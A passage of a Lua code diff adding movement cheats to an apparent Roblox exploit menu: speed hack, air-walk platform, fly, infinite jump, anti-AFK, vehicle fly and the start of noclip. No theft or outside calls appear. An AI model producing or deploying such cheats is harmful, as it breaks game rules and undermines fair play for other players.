+            local humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = val
+            end
+        end
+    end
+
+    updateSpeedDisplay()
+
+    speedInput.FocusLost:Connect(function()
+        local cleanText = speedInput.Text:gsub("%D", "")
+        local num = tonumber(cleanText)
+        if num and num > 0 then
+            applySpeed(num)
+        else
+            speedInput.Text = tostring(currentSpeed)
+        end
+    end)
+
+    resetBtn.MouseButton1Click:Connect(function()
+        applySpeed(defaultSpeed)
+    end)
+
+    boostBtn.MouseButton1Click:Connect(function()
+        applySpeed(100)
+    end)
+
+    SpeedLockBtn.MouseButton1Click:Connect(function()
+        isSpeedLocked = not isSpeedLocked
+        if isSpeedLocked then
+            SpeedLockBtn.Text = "🔒"
+            applySpeed(currentSpeed)
+        else
+            SpeedLockBtn.Text = "🔓"
+        end
+    end)
+end
+
+do
+    local platformCard = Instance.new("Frame", playerPage)
+    platformCard.Name = "PlatformCard"
+    platformCard.Size = UDim2.new(1, -8, 0, 45)
+    platformCard.BackgroundColor3 = CurrentTheme.Dark
+    platformCard.BorderSizePixel = 0
+    platformCard.ZIndex = 4
+    Instance.new("UICorner", platformCard).CornerRadius = UDim.new(0, 10)
+
+    local platformCardStroke = Instance.new("UIStroke", platformCard)
+    platformCardStroke.Thickness = 1.5
+    platformCardStroke.Color = CurrentTheme.Grey
+    platformCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = platformCard, Stroke = platformCardStroke})
+
+    local platformTitle = Instance.new("TextLabel", platformCard)
+    platformTitle.Name = "PlatformTitle"
+    platformTitle.Size = UDim2.new(1, -110, 0, 45)
+    platformTitle.Position = UDim2.new(0, 12, 0, 0)
+    platformTitle.BackgroundTransparency = 1
+    platformTitle.Text = L("PlatformTitle")
+    platformTitle.Font = Enum.Font.GothamBold
+    platformTitle.TextSize = 13
+    platformTitle.TextColor3 = CurrentTheme.White
+    platformTitle.TextXAlignment = Enum.TextXAlignment.Left
+    platformTitle.ZIndex = 5
+
+    local platformToggleBtn = Instance.new("TextButton", platformCard) 
+    platformToggleBtn.Name = "PlatformToggleBtn"
+    platformToggleBtn.Size = UDim2.new(0, 85, 0, 28)
+    platformToggleBtn.Position = UDim2.new(1, -97, 0, 8.5)
+    platformToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    platformToggleBtn.BorderSizePixel = 0
+    platformToggleBtn.Text = "PLAT" .. L("StatusOff")
+    platformToggleBtn.Font = Enum.Font.GothamBold
+    platformToggleBtn.TextSize = 10
+    platformToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+    platformToggleBtn.ZIndex = 6
+    Instance.new("UICorner", platformToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local platformToggleStroke = Instance.new("UIStroke", platformToggleBtn)
+    platformToggleStroke.Thickness = 1
+    platformToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = platformToggleBtn, Stroke = platformToggleStroke})
+
+    local platformActive = false
+    local platformObj = nil
+    local platformConnection = nil
+
+    local function togglePlatform()
+        platformActive = not platformActive
+        
+        if platformActive then
+            platformToggleBtn.Text = "PLAT" .. L("StatusOn")
+            platformToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+
+            platformObj = Instance.new("Part")
+            platformObj.Name = "AirWalkPlatform"
+            platformObj.Size = Vector3.new(5, 0.8, 5)
+            platformObj.Anchored = true
+            platformObj.CanCollide = true
+            platformObj.Material = Enum.Material.SmoothPlastic
+            platformObj.Color = Color3.fromRGB(80, 80, 90)
+            platformObj.Transparency = 0.4
+            platformObj.Parent = workspace
+
+            platformConnection = RunService.RenderStepped:Connect(function()
+                local char = LocalPlayer.Character
+                if char and char:FindFirstChild("HumanoidRootPart") and platformObj then
+                    local hrp = char.HumanoidRootPart
+                    platformObj.CFrame = CFrame.new(hrp.Position.X, hrp.Position.Y - 3.4, hrp.Position.Z)
+                end
+            end)
+        else
+            platformToggleBtn.Text = "PLAT" .. L("StatusOff")
+            platformToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+
+            if platformConnection then
+                platformConnection:Disconnect()
+                platformConnection = nil
+            end
+            if platformObj then
+                platformObj:Destroy()
+                platformObj = nil
+            end
+        end
+    end
+
+    platformToggleBtn.MouseButton1Click:Connect(togglePlatform)
+
+    LocalPlayer.CharacterAdded:Connect(function()
+        if platformActive then
+            togglePlatform()
+        end
+    end)
+end
+
+-- Fly Card (Сенсорная оптимизация UP / DOWN)
+do
+    local flyCard = Instance.new("Frame", playerPage)
+    flyCard.Name = "FlyV3Card"
+    flyCard.Size = UDim2.new(1, -8, 0, 115)
+    flyCard.BackgroundColor3 = CurrentTheme.Dark
+    flyCard.BorderSizePixel = 0
+    flyCard.ZIndex = 4
+    Instance.new("UICorner", flyCard).CornerRadius = UDim.new(0, 10)
+
+    local flyCardStroke = Instance.new("UIStroke", flyCard)
+    flyCardStroke.Thickness = 1.5
+    flyCardStroke.Color = CurrentTheme.Grey
+    flyCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = flyCard, Stroke = flyCardStroke})
+
+    local flyTitle = Instance.new("TextLabel", flyCard)
+    flyTitle.Name = "FlyTitle"
+    flyTitle.Size = UDim2.new(1, -24, 0, 22)
+    flyTitle.Position = UDim2.new(0, 12, 0, 6)
+    flyTitle.BackgroundTransparency = 1
+    flyTitle.Text = L("FlyTitle")
+    flyTitle.Font = Enum.Font.GothamBold
+    flyTitle.TextSize = 13
+    flyTitle.TextColor3 = CurrentTheme.White
+    flyTitle.TextXAlignment = Enum.TextXAlignment.Left
+    flyTitle.ZIndex = 5
+
+    local flyToggleBtn = Instance.new("TextButton", flyCard)
+    flyToggleBtn.Name = "FlyToggleBtn"
+    flyToggleBtn.Size = UDim2.new(0, 75, 0, 28)
+    flyToggleBtn.Position = UDim2.new(0, 12, 0, 34)
+    flyToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    flyToggleBtn.BorderSizePixel = 0
+    flyToggleBtn.Text = "FLY" .. (flyEnabled and L("StatusOn") or L("StatusOff"))
+    flyToggleBtn.Font = Enum.Font.GothamBold
+    flyToggleBtn.TextSize = 11
+    flyToggleBtn.TextColor3 = flyEnabled and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    flyToggleBtn.ZIndex = 6
+    Instance.new("UICorner", flyToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local flyToggleStroke = Instance.new("UIStroke", flyToggleBtn)
+    flyToggleStroke.Thickness = 1
+    flyToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = flyToggleBtn, Stroke = flyToggleStroke})
+
+    local upBtn = Instance.new("TextButton", flyCard)
+    upBtn.Size = UDim2.new(0, 50, 0, 28)
+    upBtn.Position = UDim2.new(0, 93, 0, 34)
+    upBtn.BackgroundColor3 = CurrentTheme.Black
+    upBtn.BorderSizePixel = 0
+    upBtn.Text = "UP ▲"
+    upBtn.Font = Enum.Font.GothamBold
+    upBtn.TextSize = 11
+    upBtn.TextColor3 = CurrentTheme.White
+    upBtn.ZIndex = 6
+    Instance.new("UICorner", upBtn).CornerRadius = UDim.new(0, 6)
+
+    local upBtnStroke = Instance.new("UIStroke", upBtn)
+    upBtnStroke.Thickness = 1
+    upBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = upBtn, Stroke = upBtnStroke})
+
+    local downBtn = Instance.new("TextButton", flyCard)
+    downBtn.Size = UDim2.new(0, 55, 0, 28)
+    downBtn.Position = UDim2.new(0, 149, 0, 34)
+    downBtn.BackgroundColor3 = CurrentTheme.Black
+    downBtn.BorderSizePixel = 0
+    downBtn.Text = "DOWN ▼"
+    downBtn.Font = Enum.Font.GothamBold
+    downBtn.TextSize = 10
+    downBtn.TextColor3 = CurrentTheme.White
+    downBtn.ZIndex = 6
+    Instance.new("UICorner", downBtn).CornerRadius = UDim.new(0, 6)
+
+    local downBtnStroke = Instance.new("UIStroke", downBtn)
+    downBtnStroke.Thickness = 1
+    downBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = downBtn, Stroke = downBtnStroke})
+
+    local flySpeedTitle = Instance.new("TextLabel", flyCard)
+    flySpeedTitle.Name = "FlySpeedTitle"
+    flySpeedTitle.Size = UDim2.new(0, 60, 0, 28)
+    flySpeedTitle.Position = UDim2.new(0, 12, 0, 72)
+    flySpeedTitle.BackgroundTransparency = 1
+    flySpeedTitle.Text = L("FlySpeedLabel")
+    flySpeedTitle.Font = Enum.Font.GothamMedium
+    flySpeedTitle.TextSize = 11
+    flySpeedTitle.TextColor3 = CurrentTheme.Light
+    flySpeedTitle.TextXAlignment = Enum.TextXAlignment.Left
+    flySpeedTitle.ZIndex = 5
+
+    local minusBtn = Instance.new("TextButton", flyCard)
+    minusBtn.Size = UDim2.new(0, 28, 0, 28)
+    minusBtn.Position = UDim2.new(0, 80, 0, 72)
+    minusBtn.BackgroundColor3 = CurrentTheme.Black
+    minusBtn.BorderSizePixel = 0
+    minusBtn.Text = "-"
+    minusBtn.Font = Enum.Font.GothamBold
+    minusBtn.TextSize = 14
+    minusBtn.TextColor3 = CurrentTheme.White
+    minusBtn.ZIndex = 6
+    Instance.new("UICorner", minusBtn).CornerRadius = UDim.new(0, 6)
+
+    local minusBtnStroke = Instance.new("UIStroke", minusBtn)
+    minusBtnStroke.Thickness = 1
+    minusBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = minusBtn, Stroke = minusBtnStroke})
+
+    local flySpeedInput = Instance.new("TextBox", flyCard)
+    flySpeedInput.Size = UDim2.new(0, 35, 0, 28)
+    flySpeedInput.Position = UDim2.new(0, 112, 0, 72)
+    flySpeedInput.BackgroundColor3 = CurrentTheme.Black
+    flySpeedInput.BorderSizePixel = 0
+    flySpeedInput.Text = tostring(flySpeed)
+    flySpeedInput.Font = Enum.Font.GothamBold
+    flySpeedInput.TextSize = 12
+    flySpeedInput.TextColor3 = CurrentTheme.White
+    flySpeedInput.ClearTextOnFocus = false
+    flySpeedInput.ZIndex = 6
+    Instance.new("UICorner", flySpeedInput).CornerRadius = UDim.new(0, 6)
+
+    local speedInputStroke = Instance.new("UIStroke", flySpeedInput)
+    speedInputStroke.Thickness = 1
+    speedInputStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = flySpeedInput, Stroke = speedInputStroke})
+
+    local plusBtn = Instance.new("TextButton", flyCard)
+    plusBtn.Size = UDim2.new(0, 28, 0, 28)
+    plusBtn.Position = UDim2.new(0, 151, 0, 72)
+    plusBtn.BackgroundColor3 = CurrentTheme.Black
+    plusBtn.BorderSizePixel = 0
+    plusBtn.Text = "+"
+    plusBtn.Font = Enum.Font.GothamBold
+    plusBtn.TextSize = 14
+    plusBtn.TextColor3 = CurrentTheme.White
+    plusBtn.ZIndex = 6
+    Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0, 6)
+
+    local plusBtnStroke = Instance.new("UIStroke", plusBtn)
+    plusBtnStroke.Thickness = 1
+    plusBtnStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = plusBtn, Stroke = plusBtnStroke})
+
+    flyToggleBtn.MouseButton1Click:Connect(function()
+        if flyEnabled then
+            stopFly()
+            flyToggleBtn.Text = "FLY" .. L("StatusOff")
+            flyToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+        else
+            startFly()
+            flyToggleBtn.Text = "FLY" .. L("StatusOn")
+            flyToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+        end
+    end)
+
+    -- Поддержка зажатия пальцем/курсором
+    bindHoldButton(upBtn, function() upHolding = true end, function() upHolding = false end)
+    bindHoldButton(downBtn, function() downHolding = true end, function() downHolding = false end)
+
+    plusBtn.MouseButton1Click:Connect(function()
+        flySpeed = flySpeed + 1
+        flySpeedInput.Text = tostring(flySpeed)
+    end)
+
+    minusBtn.MouseButton1Click:Connect(function()
+        if flySpeed > 1 then
+            flySpeed = flySpeed - 1
+            flySpeedInput.Text = tostring(flySpeed)
+        end
+    end)
+
+    flySpeedInput.FocusLost:Connect(function()
+        local cleanText = flySpeedInput.Text:gsub(",", ".")
+        local num = tonumber(cleanText)
+        if num and num > 0 then
+            flySpeed = math.floor(num * 100 + 0.5) / 100
+            flySpeedInput.Text = tostring(flySpeed)
+        else
+            flySpeedInput.Text = tostring(flySpeed)
+        end
+    end)
+end
+
+-- Inf Jump
+do
+    local infJumpCard = Instance.new("Frame", playerPage)
+    infJumpCard.Name = "InfJumpCard"
+    infJumpCard.Size = UDim2.new(1, -8, 0, 45)
+    infJumpCard.BackgroundColor3 = CurrentTheme.Dark
+    infJumpCard.BorderSizePixel = 0
+    infJumpCard.ZIndex = 4
+    Instance.new("UICorner", infJumpCard).CornerRadius = UDim.new(0, 10)
+
+    local infJumpCardStroke = Instance.new("UIStroke", infJumpCard)
+    infJumpCardStroke.Thickness = 1.5
+    infJumpCardStroke.Color = CurrentTheme.Grey
+    infJumpCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = infJumpCard, Stroke = infJumpCardStroke})
+
+    local infJumpTitle = Instance.new("TextLabel", infJumpCard)
+    infJumpTitle.Name = "InfJumpTitle"
+    infJumpTitle.Size = UDim2.new(1, -100, 0, 45)
+    infJumpTitle.Position = UDim2.new(0, 12, 0, 0)
+    infJumpTitle.BackgroundTransparency = 1
+    infJumpTitle.Text = L("InfJumpTitle")
+    infJumpTitle.Font = Enum.Font.GothamBold
+    infJumpTitle.TextSize = 13
+    infJumpTitle.TextColor3 = CurrentTheme.White
+    infJumpTitle.TextXAlignment = Enum.TextXAlignment.Left
+    infJumpTitle.ZIndex = 5
+
+    local infJumpToggleBtn = Instance.new("TextButton", infJumpCard)
+    infJumpToggleBtn.Name = "InfJumpToggleBtn"
+    infJumpToggleBtn.Size = UDim2.new(0, 75, 0, 28)
+    infJumpToggleBtn.Position = UDim2.new(1, -87, 0, 8.5)
+    infJumpToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    infJumpToggleBtn.BorderSizePixel = 0
+    infJumpToggleBtn.Text = "JUMP" .. L("StatusOff")
+    infJumpToggleBtn.Font = Enum.Font.GothamBold
+    infJumpToggleBtn.TextSize = 10
+    infJumpToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+    infJumpToggleBtn.ZIndex = 6
+    Instance.new("UICorner", infJumpToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local infJumpToggleStroke = Instance.new("UIStroke", infJumpToggleBtn)
+    infJumpToggleStroke.Thickness = 1
+    infJumpToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = infJumpToggleBtn, Stroke = infJumpToggleStroke})
+
+    local isInfJumpEnabled = false
+    local infJumpConnection = nil
+
+    infJumpToggleBtn.MouseButton1Click:Connect(function()
+        isInfJumpEnabled = not isInfJumpEnabled
+        if isInfJumpEnabled then
+            infJumpToggleBtn.Text = "JUMP" .. L("StatusOn")
+            infJumpToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+            infJumpConnection = UserInputService.JumpRequest:Connect(function()
+                if LocalPlayer.Character then
+                    local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+                    if hum then
+                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
+                    end
+                end
+            end)
+        else
+            infJumpToggleBtn.Text = "JUMP" .. L("StatusOff")
+            infJumpToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+            if infJumpConnection then
+                infJumpConnection:Disconnect()
+                infJumpConnection = nil
+            end
+        end
+    end)
+end
+
+-- Anti AFK
+do
+    local antiAfkCard = Instance.new("Frame", playerPage)
+    antiAfkCard.Name = "AntiAfkCard"
+    antiAfkCard.Size = UDim2.new(1, -8, 0, 45)
+    antiAfkCard.BackgroundColor3 = CurrentTheme.Dark
+    antiAfkCard.BorderSizePixel = 0
+    antiAfkCard.ZIndex = 4
+    Instance.new("UICorner", antiAfkCard).CornerRadius = UDim.new(0, 10)
+
+    local antiAfkCardStroke = Instance.new("UIStroke", antiAfkCard)
+    antiAfkCardStroke.Thickness = 1.5
+    antiAfkCardStroke.Color = CurrentTheme.Grey
+    antiAfkCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = antiAfkCard, Stroke = antiAfkCardStroke})
+
+    local antiAfkTitle = Instance.new("TextLabel", antiAfkCard)
+    antiAfkTitle.Name = "AntiAfkTitle"
+    antiAfkTitle.Size = UDim2.new(1, -100, 0, 45)
+    antiAfkTitle.Position = UDim2.new(0, 12, 0, 0)
+    antiAfkTitle.BackgroundTransparency = 1
+    antiAfkTitle.Text = L("AntiAfkTitle")
+    antiAfkTitle.Font = Enum.Font.GothamBold
+    antiAfkTitle.TextSize = 13
+    antiAfkTitle.TextColor3 = CurrentTheme.White
+    antiAfkTitle.TextXAlignment = Enum.TextXAlignment.Left
+    antiAfkTitle.ZIndex = 5
+
+    local antiAfkToggleBtn = Instance.new("TextButton", antiAfkCard)
+    antiAfkToggleBtn.Name = "AntiAfkToggleBtn"
+    antiAfkToggleBtn.Size = UDim2.new(0, 75, 0, 28)
+    antiAfkToggleBtn.Position = UDim2.new(1, -87, 0, 8.5)
+    antiAfkToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    antiAfkToggleBtn.BorderSizePixel = 0
+    antiAfkToggleBtn.Text = "AFK" .. L("StatusOff")
+    antiAfkToggleBtn.Font = Enum.Font.GothamBold
+    antiAfkToggleBtn.TextSize = 10
+    antiAfkToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+    antiAfkToggleBtn.ZIndex = 6
+    Instance.new("UICorner", antiAfkToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local antiAfkToggleStroke = Instance.new("UIStroke", antiAfkToggleBtn)
+    antiAfkToggleStroke.Thickness = 1
+    antiAfkToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = antiAfkToggleBtn, Stroke = antiAfkToggleStroke})
+
+    local isAntiAfkEnabled = false
+
+    antiAfkToggleBtn.MouseButton1Click:Connect(function()
+        isAntiAfkEnabled = not isAntiAfkEnabled
+        if isAntiAfkEnabled then
+            antiAfkToggleBtn.Text = "AFK" .. L("StatusOn")
+            antiAfkToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+            local VirtualUser = game:GetService("VirtualUser")
+            antiAfkConnection = LocalPlayer.Idled:Connect(function()
+                VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+                task.wait(1)
+                VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+            end)
+        else
+            antiAfkToggleBtn.Text = "AFK" .. L("StatusOff")
+            antiAfkToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+            if antiAfkConnection then
+                antiAfkConnection:Disconnect()
+                antiAfkConnection = nil
+            end
+        end
+    end)
+end
+
+-- Vehicle Fly
+do
+    local UIS = game:GetService("UserInputService")
+
+    local vFlyCard = Instance.new("Frame", playerPage)
+    vFlyCard.Name = "VehicleFlyCard"
+    vFlyCard.Size = UDim2.new(1, -8, 0, 95)
+    vFlyCard.BackgroundColor3 = CurrentTheme.Dark
+    vFlyCard.BorderSizePixel = 0
+    vFlyCard.ZIndex = 4
+    Instance.new("UICorner", vFlyCard).CornerRadius = UDim.new(0, 10)
+
+    local vFlyCardStroke = Instance.new("UIStroke", vFlyCard)
+    vFlyCardStroke.Thickness = 1.5
+    vFlyCardStroke.Color = CurrentTheme.Grey
+    vFlyCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = vFlyCard, Stroke = vFlyCardStroke})
+
+    local vehicleFlyTitle = Instance.new("TextLabel", vFlyCard)
+    vehicleFlyTitle.Name = "VehicleFlyTitle"
+    vehicleFlyTitle.Size = UDim2.new(1, -110, 0, 25)
+    vehicleFlyTitle.Position = UDim2.new(0, 12, 0, 8)
+    vehicleFlyTitle.BackgroundTransparency = 1
+    vehicleFlyTitle.Text = L("VehicleFlyTitle")
+    vehicleFlyTitle.Font = Enum.Font.GothamBold
+    vehicleFlyTitle.TextSize = 13
+    vehicleFlyTitle.TextColor3 = CurrentTheme.White
+    vehicleFlyTitle.TextXAlignment = Enum.TextXAlignment.Left
+    vehicleFlyTitle.ZIndex = 5
+
+    local vFlyActive = false
+    local vFlyToggleBtn = Instance.new("TextButton", vFlyCard)
+    vFlyToggleBtn.Name = "VFlyToggleBtn"
+    vFlyToggleBtn.Size = UDim2.new(0, 85, 0, 26)
+    vFlyToggleBtn.Position = UDim2.new(1, -97, 0, 8)
+    vFlyToggleBtn.BackgroundColor3 = CurrentTheme.Black
+    vFlyToggleBtn.BorderSizePixel = 0
+    vFlyToggleBtn.Text = "V-FLY" .. (vFlyActive and L("StatusOn") or L("StatusOff"))
+    vFlyToggleBtn.Font = Enum.Font.GothamBold
+    vFlyToggleBtn.TextSize = 10
+    vFlyToggleBtn.TextColor3 = vFlyActive and Color3.fromRGB(60, 225, 100) or Color3.fromRGB(225, 60, 60)
+    vFlyToggleBtn.ZIndex = 6
+    Instance.new("UICorner", vFlyToggleBtn).CornerRadius = UDim.new(0, 6)
+
+    local vFlyToggleStroke = Instance.new("UIStroke", vFlyToggleBtn)
+    vFlyToggleStroke.Thickness = 1
+    vFlyToggleStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = vFlyToggleBtn, Stroke = vFlyToggleStroke})
+
+    local vehicleFlySpeedTitle = Instance.new("TextLabel", vFlyCard)
+    vehicleFlySpeedTitle.Name = "VehicleFlySpeedTitle"
+    vehicleFlySpeedTitle.Size = UDim2.new(0, 70, 0, 28)
+    vehicleFlySpeedTitle.Position = UDim2.new(0, 12, 0, 52)
+    vehicleFlySpeedTitle.BackgroundTransparency = 1
+    vehicleFlySpeedTitle.Text = L("VehicleFlySpeedLabel")
+    vehicleFlySpeedTitle.Font = Enum.Font.GothamMedium
+    vehicleFlySpeedTitle.TextSize = 11
+    vehicleFlySpeedTitle.TextColor3 = CurrentTheme.Light
+    vehicleFlySpeedTitle.TextXAlignment = Enum.TextXAlignment.Left
+    vehicleFlySpeedTitle.ZIndex = 5
+
+    local vFlyMinusBtn = Instance.new("TextButton", vFlyCard)
+    vFlyMinusBtn.Size = UDim2.new(0, 28, 0, 28)
+    vFlyMinusBtn.Position = UDim2.new(0, 85, 0, 52)
+    vFlyMinusBtn.BackgroundColor3 = CurrentTheme.Black
+    vFlyMinusBtn.BorderSizePixel = 0
+    vFlyMinusBtn.Text = "-"
+    vFlyMinusBtn.Font = Enum.Font.GothamBold
+    vFlyMinusBtn.TextSize = 14
+    vFlyMinusBtn.TextColor3 = CurrentTheme.White
+    vFlyMinusBtn.ZIndex = 6
+    Instance.new("UICorner", vFlyMinusBtn).CornerRadius = UDim.new(0, 6)
+
+    local vFlyMinusStroke = Instance.new("UIStroke", vFlyMinusBtn)
+    vFlyMinusStroke.Thickness = 1
+    vFlyMinusStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = vFlyMinusBtn, Stroke = vFlyMinusStroke})
+
+    local vFlySpeed = 50
+    local vFlySpeedInput = Instance.new("TextBox", vFlyCard)
+    vFlySpeedInput.Size = UDim2.new(0, 45, 0, 28)
+    vFlySpeedInput.Position = UDim2.new(0, 118, 0, 52)
+    vFlySpeedInput.BackgroundColor3 = CurrentTheme.Black
+    vFlySpeedInput.BorderSizePixel = 0
+    vFlySpeedInput.Text = tostring(vFlySpeed)
+    vFlySpeedInput.Font = Enum.Font.GothamBold
+    vFlySpeedInput.TextSize = 12
+    vFlySpeedInput.TextColor3 = CurrentTheme.White
+    vFlySpeedInput.ClearTextOnFocus = false
+    vFlySpeedInput.ZIndex = 6
+    Instance.new("UICorner", vFlySpeedInput).CornerRadius = UDim.new(0, 6)
+
+    local vFlyInputStroke = Instance.new("UIStroke", vFlySpeedInput)
+    vFlyInputStroke.Thickness = 1
+    vFlyInputStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = vFlySpeedInput, Stroke = vFlyInputStroke})
+
+    local vFlyPlusBtn = Instance.new("TextButton", vFlyCard)
+    vFlyPlusBtn.Size = UDim2.new(0, 28, 0, 28)
+    vFlyPlusBtn.Position = UDim2.new(0, 168, 0, 52)
+    vFlyPlusBtn.BackgroundColor3 = CurrentTheme.Black
+    vFlyPlusBtn.BorderSizePixel = 0
+    vFlyPlusBtn.Text = "+"
+    vFlyPlusBtn.Font = Enum.Font.GothamBold
+    vFlyPlusBtn.TextSize = 14
+    vFlyPlusBtn.TextColor3 = CurrentTheme.White
+    vFlyPlusBtn.ZIndex = 6
+    Instance.new("UICorner", vFlyPlusBtn).CornerRadius = UDim.new(0, 6)
+
+    local vFlyPlusStroke = Instance.new("UIStroke", vFlyPlusBtn)
+    vFlyPlusStroke.Thickness = 1
+    vFlyPlusStroke.Color = CurrentTheme.Grey
+    table.insert(registeredButtons, {Button = vFlyPlusBtn, Stroke = vFlyPlusStroke})
+
+    local vFlyConnection = nil
+    local bv, bg = nil, nil
+
+    local function applyVFlySpeed(val)
+        vFlySpeed = math.clamp(math.floor(val or 50), 1, 1000)
+        vFlySpeedInput.Text = tostring(vFlySpeed)
+    end
+
+    local function getVehicleRoot()
+        local char = LocalPlayer.Character
+        if not char then return nil end
+        local hum = char:FindFirstChildWhichIsA("Humanoid")
+        if not hum or not hum.SeatPart then return nil end
+        return hum.SeatPart.AssemblyRootPart or hum.SeatPart
+    end
+
+    local function toggleVFly()
+        vFlyActive = not vFlyActive
+        
+        if vFlyActive then
+            vFlyToggleBtn.Text = "V-FLY" .. L("StatusOn")
+            vFlyToggleBtn.TextColor3 = Color3.fromRGB(60, 225, 100)
+
+            vFlyConnection = RunService.RenderStepped:Connect(function()
+                local root = getVehicleRoot()
+                if root then
+                    if not bv or bv.Parent ~= root then
+                        if bv then bv:Destroy() end
+                        bv = Instance.new("BodyVelocity")
+                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                        bv.Parent = root
+                    end
+                    if not bg or bg.Parent ~= root then
+                        if bg then bg:Destroy() end
+                        bg = Instance.new("BodyGyro")
+                        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                        bg.P = 10000
+                        bg.Parent = root
+                    end
+
+                    local cam = workspace.CurrentCamera
+                    bg.CFrame = cam.CFrame
+
+                    local moveDir = Vector3.zero
+                    if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
+                    if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
+                    if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
+                    if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
+
+                    if moveDir.Magnitude > 0 then
+                        bv.Velocity = moveDir.Unit * vFlySpeed
+                    else
+                        bv.Velocity = Vector3.zero
+                    end
+                else
+                    if bv then bv:Destroy() bv = nil end
+                    if bg then bg:Destroy() bg = nil end
+                end
+            end)
+        else
+            vFlyToggleBtn.Text = "V-FLY" .. L("StatusOff")
+            vFlyToggleBtn.TextColor3 = Color3.fromRGB(225, 60, 60)
+
+            if vFlyConnection then
+                vFlyConnection:Disconnect()
+                vFlyConnection = nil
+            end
+            if bv then bv:Destroy() bv = nil end
+            if bg then bg:Destroy() bg = nil end
+        end
+    end
+
+    vFlyToggleBtn.MouseButton1Click:Connect(toggleVFly)
+
+    vFlyPlusBtn.MouseButton1Click:Connect(function()
+        applyVFlySpeed(vFlySpeed + 10)
+    end)
+
+    vFlyMinusBtn.MouseButton1Click:Connect(function()
+        applyVFlySpeed(vFlySpeed - 10)
+    end)
+
+    vFlySpeedInput.FocusLost:Connect(function()
+        local cleanText = vFlySpeedInput.Text:gsub("%D", "")
+        local num = tonumber(cleanText)
+        if num then
+            applyVFlySpeed(num)
+        else
+            vFlySpeedInput.Text = tostring(vFlySpeed)
+        end
+    end)
+end
+
+-- Noclip
+do
+    local noclipEnabled = false
+    local noclipConnection = nil
+
+    local noclipCard = Instance.new("Frame", playerPage)
+    noclipCard.Name = "NoclipCard"
+    noclipCard.Size = UDim2.new(1, -8, 0, 50)
+    noclipCard.BackgroundColor3 = CurrentTheme.Dark
+    noclipCard.BorderSizePixel = 0
+    noclipCard.Active = true
+    noclipCard.ZIndex = 4
+    Instance.new("UICorner", noclipCard).CornerRadius = UDim.new(0, 10)
+
+    local noclipCardStroke = Instance.new("UIStroke", noclipCard)
+    noclipCardStroke.Thickness = 1.5
+    noclipCardStroke.Color = CurrentTheme.Grey
+    noclipCardStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    table.insert(registeredButtons, {Button = noclipCard, Stroke = noclipCardStroke})
+
+    local noclipTitle = Instance.new("TextLabel", noclipCard)
+    noclipTitle.Name = "NoclipTitle"
+    noclipTitle.Size = UDim2.new(1, -110, 1, 0)
+    noclipTitle.Position = UDim2.new(0, 12, 0, 0)
+    noclipTitle.BackgroundTransparency = 1
+    noclipTitle.Text = L("NoclipTitle")
+    noclipTitle.Font = Enum.Font.GothamBold
+    noclipTitle.TextSize = 13
+    noclipTitle.TextColor3 = CurrentTheme.White
+    noclipTitle.TextXAlignment = Enum.TextXAlignment.Left
+    noclipTitle.ZIndex = 5
+
+    local noclipToggleBtn = Instance.new("TextButton", noclipCard)
+    noclipToggleBtn.Name = "NoclipToggleBtn"
